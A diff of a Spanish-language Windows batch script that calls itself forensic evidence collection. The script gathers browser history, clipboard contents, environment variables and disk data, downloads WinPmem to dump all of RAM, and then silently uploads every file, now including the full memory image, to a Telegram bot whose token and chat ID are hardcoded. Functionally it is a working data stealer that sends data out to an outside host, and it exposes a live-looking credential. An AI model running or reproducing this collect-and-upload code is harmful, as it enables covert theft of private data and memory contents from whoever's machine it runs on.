@@ -127,7 +127,7 @@ echo. >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
 wmic logicaldisk get deviceid,size,freespace,volumename >> C:\EVIDENCIAS_COMPLETAS\09_discos.txt
 
 :: ============================================
-:: 4. GENERAR VOLCADO DE RAM CON PROCDUMP
+:: 4. GENERAR VOLCADO DE RAM CON WINPMEM
 :: ============================================
 echo.
 echo ============================================================
@@ -135,13 +135,19 @@ echo   GENERANDO VOLCADO DE MEMORIA RAM (FTK Imager)
 echo ============================================================
 echo.
 
-:: Verificar que procdump.exe existe
-if exist C:\EVIDENCIAS_COMPLETAS\procdump.exe (
-    echo Ejecutando procdump.exe...
-    C:\EVIDENCIAS_COMPLETAS\procdump.exe -ma -accepteula C:\EVIDENCIAS_COMPLETAS\memory.dmp
-    echo Volcado de RAM generado: memory.dmp
+:: Descargar WinPmem
+if not exist C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe (
+    echo Descargando WinPmem...
+    curl -L -o C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe https://github.com/Velocidex/WinPmem/releases/download/v4.0/winpmem_mini_x64.exe
+)
+
+:: Verificar que existe y ejecutar
+if exist C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe (
+    echo Ejecutando WinPmem para generar memory.raw...
+    C:\EVIDENCIAS_COMPLETAS\winpmem_mini_x64.exe C:\EVIDENCIAS_COMPLETAS\memory.raw
+    echo Volcado de RAM generado: memory.raw
 ) else (
-    echo ERROR: No se encuentra procdump.exe
+    echo ERROR: No se encuentra winpmem_mini_x64.exe
 )
 
 :: ============================================
@@ -168,7 +174,7 @@ echo - 08_variables.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo - 09_discos.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo - chrome_history_backup.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo - edge_history_backup.txt >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
-echo - memory.dmp (Volcado de RAM) >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
+echo - memory.raw (Volcado de RAM para FTK Imager) >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo              FIN DEL INFORME >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
 echo ============================================================ >> C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt
@@ -182,6 +188,7 @@ echo Enviando archivos a Telegram...
 set BOT_TOKEN=8886338270:AAHbMMSRXqOSKKc5CaTiw2mdWACnV_0Zd2Q
 set CHAT_ID=5064456618
 
+:: Enviar archivos de texto
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
@@ -194,7 +201,15 @@ curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_vari
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+
+:: Enviar volcado de RAM (si existe)
+if exist C:\EVIDENCIAS_COMPLETAS\memory.raw (
+    echo Enviando volcado de RAM (puede tardar varios minutos)...
+    curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.raw" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+    echo Volcado de RAM enviado.
+) else (
+    echo ERROR: No se encontró memory.raw
+)
 
 echo.
 echo ============================================================
